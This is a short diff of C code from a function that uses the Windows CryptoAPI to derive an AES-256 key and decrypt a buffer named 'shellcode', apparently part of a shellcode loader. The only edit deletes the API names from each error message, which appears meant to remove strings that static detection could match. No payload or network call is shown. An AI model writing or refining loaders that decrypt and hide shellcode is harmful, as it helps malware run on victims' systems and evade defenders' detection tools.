@@ -68,20 +68,20 @@ void DecryptAES(char* shellcode, DWORD shellcodeLen, char* key, DWORD keyLen) {
         return;
     }
     if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
-        printf("Failed in CryptCreateHash (%u)\n", GetLastError());
+        printf("Failed in  (%u)\n", GetLastError());
         return;
     }
     if (!CryptHashData(hHash, (BYTE*)key, keyLen, 0)) {
-        printf("Failed in CryptHashData (%u)\n", GetLastError());
+        printf("Failed in  (%u)\n", GetLastError());
         return;
     }
     if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
-        printf("Failed in CryptDeriveKey (%u)\n", GetLastError());
+        printf("Failed in  (%u)\n", GetLastError());
         return;
     }
 
     if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)shellcode, &shellcodeLen)) {
-        printf("Failed in CryptDecrypt (%u)\n", GetLastError());
+        printf("Failed in  (%u)\n", GetLastError());
         return;
     }
 
